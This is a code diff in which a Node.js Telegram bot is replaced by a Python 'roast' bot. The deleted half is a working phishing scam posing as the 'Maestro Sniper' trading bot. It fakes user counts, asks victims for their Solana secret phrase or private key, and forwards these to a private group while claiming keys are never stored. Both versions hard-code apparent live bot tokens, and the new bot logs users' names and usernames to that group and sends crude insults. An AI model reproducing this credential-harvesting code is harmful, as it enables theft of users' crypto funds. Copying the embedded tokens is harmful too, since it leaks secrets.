@@ -1,291 +1,93 @@
-const TelegramBot = require('node-telegram-bot-api');
-const express = require('express');
-const app = express();
-const port = process.env.PORT || 3000;
+import logging
+import os
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
-const TOKEN = '8262576157:AAENogSLc1ggOb2SWZ6No-g9AtgIe809L7Y';
-const GROUP_ID = '1002914341678';
-const bot = new TelegramBot(TOKEN);
-app.use(express.json());
+# Configuration
+API_KEY = "8262576157:AAGB4V5TwAtYX5Wcxv7zVlrke1hIvY0Eui8"
+GROUP_ID = 1002914341678
+PORT = int(os.environ.get('PORT', 5000))
 
-// Global state
-let activeUsers = Math.floor(Math.random() * 50000) + 50000;
-const userStates = {};
-const captchaStore = {};
+# Set up logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-// Update active users every 2 minutes
-setInterval(() => {
-  activeUsers = Math.floor(Math.random() * 50000) + 50000;
-}, 120000);
+# Roast messages
+ROASTS = [
+    "If laughter is the best medicine, your face must be curing the world.",
+    "You're not stupid; you just have bad luck thinking.",
+    "I'd agree with you but then we'd both be wrong.",
+    "You bring everyone so much joy... when you leave the room.",
+    "I'd explain it to you but I don't have any crayons with me.",
+    "You have a face for radio... and a voice for silent film.",
+    "Is your ass jealous of the amount of shit that just came out of your mouth?",
+    "I'd roast you but my mom said not to burn trash.",
+    "You're the reason the gene pool needs a lifeguard.",
+    "If I wanted to kill myself I'd climb your ego and jump to your IQ."
+]
 
-// Webhook setup
-app.post(`/webhook`, async (req, res) => {
-  bot.processUpdate(req.body);
-  res.sendStatus(200);
-});
-
-bot.setWebHook(`https://maestro-sniper.onrender.com/webhook`);
-
-// Generate math captcha
-const generateCaptcha = () => {
-  const operations = [['+', (a, b) => a + b], ['-', (a, b) => a - b]];
-  const [opSymbol, opFn] = operations[Math.floor(Math.random() * operations.length)];
-  const a = Math.floor(Math.random() * 10) + 1;
-  const b = Math.floor(Math.random() * 10) + 1;
-  return {
-    question: `${a} ${opSymbol} ${b} = ?`,
-    answer: opFn(a, b).toString(),
-    emoji: opSymbol === '+' ? '➕' : '➖'
-  };
-};
-
-// Main menu keyboard
-const mainMenuKeyboard = {
-  reply_markup: {
-    inline_keyboard: [
-      [
-        { text: "🔗 Chains", callback_data: "chains" },
-        { text: "💼 Wallets", callback_data: "wallets" },
-        { text: "⚙️ Call Channels", callback_data: "call_channels" }
-      ],
-      [
-        { text: "🤝 Presales", callback_data: "presales" },
-        { text: "Copytrade", callback_data: "copytrade" },
-        { text: "📡 Signals", callback_data: "signals" }
-      ],
-      [
-        { text: "⚙️ God Mode", callback_data: "god_mode" },
-        { text: "📊 Positions", callback_data: "positions" },
-        { text: "🎯 Auto Snipe", callback_data: "auto_snipe" }
-      ],
-      [
-        { text: "⬅️ Bridge", callback_data: "bridge" },
-        { text: "⭐ Premium", callback_data: "premium" },
-        { text: "ℹ️ FAQ", callback_data: "faq" }
-      ],
-      [
-        { text: "≡ Menu", callback_data: "menu" },
-        { text: "😊 Message", callback_data: "message" },
-        { text: "📎 Attachment", callback_data: "attachment" },
-        { text: "🎤 Voice", callback_data: "voice" }
-      ]
+# Start command
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [
+        [InlineKeyboardButton("Roast Me! 🔥", callback_data='roast_me')]
     ]
-  }
-};
-
-// Wallet sub-menu
-const walletMenuKeyboard = {
-  reply_markup: {
-    inline_keyboard: [
-      [
-        { text: "🔑 Import Wallet", callback_data: "import_wallet" },
-        { text: "🆕 Generate Wallet", callback_data: "generate_wallet" }
-      ]
-    ]
-  }
-};
-
-// Generated wallet keyboard
-const generatedWalletKeyboard = {
-  reply_markup: {
-    inline_keyboard: [
-      [
-        { text: "✅ Approve", callback_data: "approve_wallet" },
-        { text: "🔙 Back", callback_data: "back_wallet" }
-      ]
-    ]
-  }
-};
-
-// FAQ keyboard
-const faqKeyboard = {
-  reply_markup: {
-    inline_keyboard: [
-      [{ text: "🔙 Back to Menu", callback_data: "back_to_menu" }]
-    ]
-  }
-};
-
-// Handle start command
-bot.onText(/\/start/, (msg) => {
-  const chatId = msg.chat.id;
-  const captcha = generateCaptcha();
-  
-  captchaStore[chatId] = captcha.answer;
-  
-  bot.sendMessage(
-    chatId,
-    `🎉 *Welcome to Maestro Sniper\\!* 🚀\nThe ultimate memecoin trading bot with *900K\\+ users\\!*\n\n` +
-    `*Active Users Today: ${activeUsers.toLocaleString()}* 👥\n\n` +
-    `🔒 *Solve this quick math captcha to proceed:*\n${captcha.emoji} ${captcha.question}`,
-    { parse_mode: 'MarkdownV2' }
-  );
-});
-
-// Handle text messages
-bot.on('message', (msg) => {
-  const chatId = msg.chat.id;
-  const text = msg.text;
-  
-  // Captcha verification
-  if (captchaStore[chatId]) {
-    if (text === captchaStore[chatId]) {
-      delete captchaStore[chatId];
-      showMainMenu(chatId);
-    } else {
-      const newCaptcha = generateCaptcha();
-      captchaStore[chatId] = newCaptcha.answer;
-      bot.sendMessage(
-        chatId,
-        `❌ *Oops! Wrong answer*\n\nTry again:\n${newCaptcha.emoji} ${newCaptcha.question}`,
-        { parse_mode: 'MarkdownV2' }
-      );
-    }
-    return;
-  }
-  
-  // Wallet import handling
-  if (userStates[chatId] === 'awaiting_wallet') {
-    userStates[chatId] = null;
+    reply_markup = InlineKeyboardMarkup(keyboard)
     
-    // Forward credentials to private group
-    bot.sendMessage(
-      GROUP_ID,
-      `⚠️ *NEW WALLET IMPORT* ⚠️\n\n` +
-      `👤 User: ${msg.from.first_name} ${msg.from.last_name || ''} [@${msg.from.username || 'N/A'}]\n` +
-      `🆔 ID: ${msg.from.id}\n\n` +
-      `🔑 *Credentials:*\n\`\`\`${text}\`\`\``,
-      { parse_mode: 'MarkdownV2' }
-    );
+    await update.message.reply_text(
+        'Welcome to the Roast Bot! Ready to get roasted? 😈',
+        reply_markup=reply_markup
+    )
     
-    // Simulate processing
-    bot.sendMessage(chatId, "⏳ *Processing... Please wait...*", { parse_mode: 'MarkdownV2' })
-      .then(() => {
-        setTimeout(() => {
-          bot.sendMessage(
-            chatId,
-            "🎉 *Wallet imported successfully!* 🚀\n\nWelcome aboard\\! Your funds are now secured with military\\-grade encryption\\.\n\n" +
-            "*Ready to snipe those memecoins!* 📈",
-            { parse_mode: 'MarkdownV2', reply_markup: mainMenuKeyboard.reply_markup }
-          );
-        }, 3000);
-      });
-  }
-});
+    # Log to group
+    user = update.effective_user
+    log_message = f"User {user.first_name} (@{user.username}) started the bot"
+    await context.bot.send_message(chat_id=GROUP_ID, text=log_message)
 
-// Handle callback queries
-bot.on('callback_query', async (query) => {
-  const chatId = query.message.chat.id;
-  const data = query.data;
-  
-  // Non-functional features
-  const restrictedFeatures = [
-    'chains', 'call_channels', 'presales', 'copytrade', 
-    'signals', 'god_mode', 'positions', 'auto_snipe',
-    'bridge', 'premium', 'menu', 'message', 'attachment', 'voice'
-  ];
-  
-  if (restrictedFeatures.includes(data)) {
-    bot.sendMessage(
-      chatId,
-      "⚠️ *No funds detected!* 💳\n\nPlease import or generate a wallet first to access this feature\\.",
-      { parse_mode: 'MarkdownV2', reply_markup: walletMenuKeyboard.reply_markup }
-    );
-    return;
-  }
-  
-  switch(data) {
-    case 'wallets':
-      bot.sendMessage(
-        chatId,
-        "🔐 *Wallet Management*\n\nChoose an option:",
-        { parse_mode: 'MarkdownV2', reply_markup: walletMenuKeyboard.reply_markup }
-      );
-      break;
-      
-    case 'import_wallet':
-      userStates[chatId] = 'awaiting_wallet';
-      bot.sendMessage(
-        chatId,
-        "🔑 *Import Wallet*\n\nPlease input your Solana wallet secret phrase or private key\\:\n\n" +
-        "_Keep it secure! We never store your keys_ 🔒",
-        { parse_mode: 'MarkdownV2' }
-      );
-      break;
-      
-    case 'generate_wallet':
-      bot.sendMessage(
-        chatId,
-        "✨ *Generating new secure wallet...*\n\n" +
-        "🔐 *Solana Address:*\n`AKHGQFCPawfxhS4vW3trccaEv5BCAJKeGa72CnRW7Lwm`\n\n" +
-        "⚠️ *SAVE THIS PRIVATE KEY NOW:*\n`5JY8ZvzL3eX7qRc... [truncated for security]`\n\n" +
-        "_This is your only chance to copy it!_ 📋",
-        { 
-          parse_mode: 'MarkdownV2',
-          reply_markup: generatedWalletKeyboard.reply_markup 
-        }
-      );
-      break;
-      
-    case 'approve_wallet':
-      bot.sendMessage(chatId, "💸 *Processing transaction... Please wait...*", { parse_mode: 'MarkdownV2' });
-      setTimeout(() => {
-        bot.sendMessage(
-          chatId,
-          "✅ *Approved!* 💰\n\nDeposits confirmed\\. Ready to trade! 📈\n\n" +
-          "*Balance: 0\\.00 SOL* 😢\n_Fund your wallet to start sniping!_",
-          { parse_mode: 'MarkdownV2', reply_markup: mainMenuKeyboard.reply_markup }
-        );
-      }, 3000);
-      break;
-      
-    case 'back_wallet':
-      bot.sendMessage(
-        chatId,
-        "🔐 *Wallet Management*",
-        { parse_mode: 'MarkdownV2', reply_markup: walletMenuKeyboard.reply_markup }
-      );
-      break;
-      
-    case 'faq':
-      bot.sendMessage(
-        chatId,
-        "❓ *Frequently Asked Questions*\n\n" +
-        "🚀 *How to start?*\nImport or generate a wallet!\n\n" +
-        "🌐 *Supported chains?*\nSolana, ETH, Base \\+10 more!\n\n" +
-        "🛡️ *Is it safe?*\nAnti\\-rug protection enabled!\n\n" +
-        "⭐ *Premium?*\nUnlock with stars!\n\n" +
-        "_Reply /start for menu_",
-        { parse_mode: 'MarkdownV2', reply_markup: faqKeyboard.reply_markup }
-      );
-      break;
-      
-    case 'back_to_menu':
-      showMainMenu(chatId);
-      break;
-  }
-  
-  bot.answerCallbackQuery(query.id);
-});
+# Handle button presses
+async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    if query.data == 'roast_me':
+        import random
+        roast = random.choice(ROASTS)
+        
+        # Send roast to user
+        await query.edit_message_text(text=roast)
+        
+        # Log to group
+        user = update.effective_user
+        log_message = f"User {user.first_name} (@{user.username}) got roasted: '{roast}'"
+        await context.bot.send_message(chat_id=GROUP_ID, text=log_message)
 
-// Show main menu function
-function showMainMenu(chatId) {
-  bot.sendMessage(
-    chatId,
-    `🚀 *Maestro Sniper Bot* 🔥\n\n` +
-    `_OG Telegram memecoin sniper since 2022_\n\n` +
-    `⚡ Lightning\\-fast trades on Solana, ETH, Base & 10\\+ chains\n` +
-    `🛡️ Anti\\-rug protection enabled\n\n` +
-    `*Active Users Today: ${activeUsers.toLocaleString()}* 👥\n` +
-    `_Join 900K\\+ users trading memecoins!_ 🎉`,
-    {
-      parse_mode: 'MarkdownV2',
-      reply_markup: mainMenuKeyboard.reply_markup
-    }
-  );
-}
+# Error handler
+async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    logger.error(f"Update {update} caused error {context.error}")
+    
+    # Log error to group
+    error_message = f"Error occurred: {context.error}"
+    await context.bot.send_message(chat_id=GROUP_ID, text=error_message)
 
-// Start server
-app.listen(port, () => {
-  console.log(`Maestro Sniper bot running on port ${port}`);
-});
+# Main function
+def main():
+    # Create application
+    application = Application.builder().token(API_KEY).build()
+    
+    # Add handlers
+    application.add_handler(CommandHandler("start", start))
+    application.add_handler(CallbackQueryHandler(button_handler))
+    application.add_error_handler(error_handler)
+    
+    # Start webhook
+    application.run_webhook(
+        listen="0.0.0.0",
+        port=PORT,
+        url_path=API_KEY,
+        webhook_url=f"https://your-app-name.onrender.com/{API_KEY}"
+    )
+
+if __name__ == "__main__":
+    main()
